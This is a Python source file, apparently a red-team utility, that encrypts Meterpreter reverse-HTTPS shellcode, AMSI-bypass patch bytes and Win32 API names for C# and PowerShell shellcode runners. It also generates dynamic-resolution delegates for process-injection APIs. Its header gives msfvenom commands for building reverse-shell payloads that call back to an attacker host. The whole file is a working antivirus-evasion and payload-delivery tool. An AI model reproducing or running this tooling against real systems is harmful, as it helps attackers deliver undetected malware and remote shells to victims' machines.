from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from os import urandom
import argparse

# ------------------
# AesEncryptor.py 
# ------------------
# This helper program will print various api names, x64 & x86 shellcode, a key and an IV using Aes256 CBC Encryption for use with NetRunners C# or AES Encrypted PowerShell Shellcode Runners.
# Author: @gustanini (Rafael Pimentel)
# Hacker Hermanos: https://linktr.ee/hackerhermanos

# ------------------
# Instructions
# ------------------
# Generate your x64 payload, save as buf in configuration section below: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f python
# Generate your x86 payload, save as buf86 in configuration section below: msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f python
# Run this program selecting your desired format (currently csharp or powershell).

# ------------------
# Functions
# ------------------
class Encryptor:

    # generate aes initialization vector 16 byte
    @staticmethod
    def generate_iv_aes():
        return urandom(16)
    # generate aes key 32 byte
    @staticmethod
    def generate_key_aes():
        return urandom(32)
    # aes encryptor: 256CBC, PKCS7 padding
    @staticmethod
    def encrypt_bytes_to_bytes_aes(plain_bytes, aes_key, aes_iv):
        # Encrypts a byte array using AES encryption with the given key.

        # :param plain_bytes: Byte array containing the unencrypted byte[] to encrypt.
        # :param aes_key: Byte array containing the encryption key.
        # :param aes_key: Byte array containing the initialization vector.
        # :return: Byte array containing the encrypted data.

        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(plain_bytes) + padder.finalize()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        return aes_iv + encrypted
    @staticmethod
    def encrypt_bytes_to_bytes_xor(plain_bytes, xor_key):
        # Encrypts a byte array using XOR encryption with the given key.
        
        # :param plain_bytes: Byte array containing the unencrypted byte[] to encrypt.
        # :param xor_key: Byte array containing the encryption key.
        # :return: Byte array containing the encrypted data.

        if not xor_key:
            raise ValueError("Key cannot be empty.")
        ciphertext_bytes = bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(plain_bytes)])
        return ciphertext_bytes

    # ------------------
    # POWERSHELL PRINTER
    # ------------------
    # printer, outputs to powershell format
    @staticmethod
    def to_powershell_byte_array(byte_data):
        return ', '.join(f'0x{b:02X}' for b in byte_data)
    # print in powershell format
    @staticmethod
    def print_powershell():
        # print key, IV
        print(f"[Byte[]] $AesKey = {Encryptor.to_powershell_byte_array(aes_key)}")
        print(f"[Byte[]] $AesIV = {Encryptor.to_powershell_byte_array(aes_iv)}")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf, aes_key, aes_iv)
        print(f"[Byte[]] $buf = {Encryptor.to_powershell_byte_array(encrypted_data)}")         

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf86, aes_key, aes_iv)        
        print(f"[Byte[]] $buf86 = {Encryptor.to_powershell_byte_array(encrypted_data)}")       

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(patch_bytes, aes_key, aes_iv)
            print(f"[Byte[]] ${patch_name} = {Encryptor.to_powershell_byte_array(encrypted_data)}")

        # api names
        API_NAME_MAP["AmsiSb"] = "AmsiScanBuffer".encode() # add amsiscanbuffer as "AmsiSb" to avoid sig detection

        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(api_bytes, aes_key, aes_iv)
            print(f"[Byte[]] ${api_name.replace('.', '')}_Bytes = {Encryptor.to_powershell_byte_array(encrypted_data)}")

    # ------------------
    # CSHARP PRINTER
    # ------------------
    # printer, outputs to csharp format
    @staticmethod
    def to_csharp_byte_array(byte_data):
        return ', '.join(f'0x{b:02X}' for b in byte_data)
    # print in csharp format
    @staticmethod
    def print_csharp():
        # print key, IV
        print("public static byte[] AesKey =" + "{" + f"{Encryptor.to_csharp_byte_array(aes_key)}" + "};")
        print("public static byte[] AesIv =" + "{" + f"{Encryptor.to_csharp_byte_array(aes_iv)}" + "};")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf, aes_key, aes_iv)
        print("public static byte[] buf =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf86, aes_key, aes_iv)        
        print("public static byte[] buf86 =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # print unencrypted buf sizes (encrypted buf size is different)
        print(f"public static int sBuf = {len(buf)};")
        print(f"public static int sBuf86 = {len(buf86)};")

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(patch_bytes, aes_key, aes_iv)
            print(f"public static byte[] {patch_name} =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # api names
        API_NAME_MAP["AmsiScanBuffer"] = "AmsiScanBuffer".encode() # add amsiscanbuffer for use with netrunners
        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(api_bytes, aes_key, aes_iv)
            print(f"public static byte[] {api_name.replace('.', '')}_Bytes =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

    # ------------------
    # CSHARP PRINTER (XOR)
    # ------------------
    # print in csharp format using xor encryption
    @staticmethod
    def print_csharp_xor():
        # print key, IV
        print("public static byte[] xor_key =" + "{" + f"{Encryptor.to_csharp_byte_array(xor_key)}" + "};")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(buf, xor_key)
        print("public static byte[] buf =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(buf86, xor_key)
        print("public static byte[] buf86 =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # print unencrypted buf sizes (encrypted buf size is different)
        print(f"public static int sBuf = {len(buf)};")
        print(f"public static int sBuf86 = {len(buf86)};")

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(patch_bytes, xor_key)
            print(f"public static byte[] {patch_name} =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # api names
        API_NAME_MAP["AmsiScanBuffer"] = "AmsiScanBuffer".encode() # add amsiscanbuffer for use with netrunners
        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(api_bytes, xor_key)
            print(f"public static byte[] {api_name.replace('.', '')}_Bytes =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

    # ------------------
    # CSHARP DELEGATE PRINTER
    # ------------------
    # print csharp delegates (getprocaddress, getmodulehandle)
    @staticmethod
    def print_csharp_delegates(pinvoke_signatures):
        for signature in pinvoke_signatures:
            lines = signature.split('\n')
            if len(lines) != 2:
                print("Invalid P/Invoke signature format. It should have exactly 2 lines.")
                continue
            
            # Parse DllImport lines
            attributes_line = lines[0].strip()
            method_signature = lines[1].strip()
            
            #method_parts = method_signature.split(' ')
            
            # Parse variables
            data_type = method_signature.split(" ")[3]
            api_name = method_signature.split(" ")[4].split("(")[0]
            parameters = method_signature.split("(")[1].split(")")[0]
            dll_name = attributes_line.split('"')[1]
            

            # Generate C# code
            delegate_code = (
                f"//// import {api_name.upper()}\n"
                f"public delegate {data_type} p{api_name}({parameters});\n"
                f"public static p{api_name} {api_name} = (p{api_name})Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle(\"{dll_name}\"), DecryptBytesToStringAes({api_name}_Bytes, AesKey)), typeof(p{api_name}));\n"
            )
            print(delegate_code)

# ------------------
# Configuration Section
# ------------------

# payloads
buf =  b""
buf86 =  b""

# amsi patches dictionary
AMSI_PATCH_MAP = {
    "AmsiPatch" : bytes([0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3]),
    "AmsiPatch86" : bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]) # this unencrypted payload is flagged
}

# Win32 api names
API_NAMES = [
    "CloseHandle",
    "ConnectNamedPipe",
    "ConvertSidToStringSidW",
    "CreateNamedPipeW",
    "CreateProcessA",
    "CreateProcessWithTokenW",
    "CreateRemoteThread",
    "CreateThread",
    "CreateToolhelp32Snapshot",
    "DuplicateTokenEx",
    "FlsAlloc",
    "GetCurrentProcess",
    "GetCurrentThread",
    "GetStdHandle",
    "GetTokenInformation",
    "ImpersonateNamedPipeClient",
    "IsWow64Process",
    "LoadLibraryA",
    "OpenProcess",
    "OpenThread",
    "OpenThreadToken",
    "Process32First",
    "Process32Next",
    "ReadProcessMemory",
    "ResumeThread",
    "SuspendThread",
    "VirtualAlloc",
    "VirtualAllocEx",
    "VirtualAllocExNuma",
    "VirtualProtect",
    "VirtualProtectEx",
    "WaitForSingleObject",
    "WriteProcessMemory",
    "ZwQueryInformationProcess",
    # patcher
    "NtTraceEvent",
    "amsi.dll"  # to-do take this outta here
]
API_NAME_MAP = {api: api.encode() for api in sorted(API_NAMES)}
# Win32 API PINVOKE SIGS
pinvoke_signatures = [
    '''[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);''',
    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool ConvertSidToStringSidW(IntPtr pSID, out IntPtr ptrSid);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipeW(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern int CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);''',
    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);''',
    '''[DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
    '''[DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr FlsAlloc(IntPtr lpCallback);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentThread();''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetStdHandle(int nStdHandle);''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);''',
    '''[DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
    public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr LoadLibraryA(string name);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr OpenProcess(uint processAccess, int bInheritHandle, UInt32 processId);''',
    '''[DllImport("kernel32.dll")]
    public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);''',
    '''[DllImport("kernel32.dll")]
    public static extern int Process32First(IntPtr hSnapshot, ref ProcessEntry32 lppe);''',
    '''[DllImport("kernel32.dll")]
    public static extern int Process32Next(IntPtr hSnapshot, ref ProcessEntry32 lppe);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern int ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);''',
    '''[DllImport("kernel32.dll")]
    public static extern uint SuspendThread(IntPtr hThread);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern int VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern int VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);''',
    '''[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);'''
]
pinvoke_signatures = sorted(pinvoke_signatures)

# ------------------
# Main Function
# ------------------
# Define a main function to handle argument parsing
def main():
    # Create the parser
    parser = argparse.ArgumentParser(description="Encryptor Script")
    # Add arguments
    parser.add_argument("-csharp", action="store_true", help="Print the output in C# format.")
    parser.add_argument("-csdelegates", action="store_true", help="Print win32 api delegates in C# format.")
    parser.add_argument("-powershell", action="store_true", help="Print the output in PowerShell format.")
    parser.add_argument("-xor", action="store_true", help="Print the output in C# format using XOR encryption.")
    parser.add_argument("-buf", type=str, help="Path to Python-formatted x64 shellcode file (defines `buf`).")
    parser.add_argument("-buf86", type=str, help="Path to Python-formatted x86 shellcode file (defines `buf86`).")

    # Parse the arguments
    args = parser.parse_args()

    # Load shellcode buffers from files (.py format) 
    global buf, buf86
    if not args.buf and not args.buf86:
        parser.error("At least one of --buf or --buf86 must be specified.")

    if args.buf:
        with open(args.buf, 'r') as f:
            scope = {}
            exec(f.read(), scope)
            buf = scope.get('buf', b"")

    if args.buf86:
        with open(args.buf86, 'r') as f:
            scope = {}
            exec(f.read(), scope)
            buf86 = scope.get('buf', b"")

    if args.csharp:
        Encryptor.print_csharp()
    elif args.xor:
        Encryptor.print_csharp_xor()
    elif args.powershell:
        Encryptor.print_powershell()
    elif args.csdelegates:
        Encryptor.print_csharp_delegates(pinvoke_signatures)
    else:
        Encryptor.print_powershell()

if __name__ == "__main__":
    # generate keys
    aes_key = Encryptor.generate_key_aes()
    aes_iv = Encryptor.generate_iv_aes()
    xor_key = b".pdata"
    
    main()

# ------------------
# To-Do
# ------------------

# add -c format
# add -vba format (decimal)
# add powershell delegates
# refactor functions to make them more efficient/flexible
# split apis and dlls into two different arrays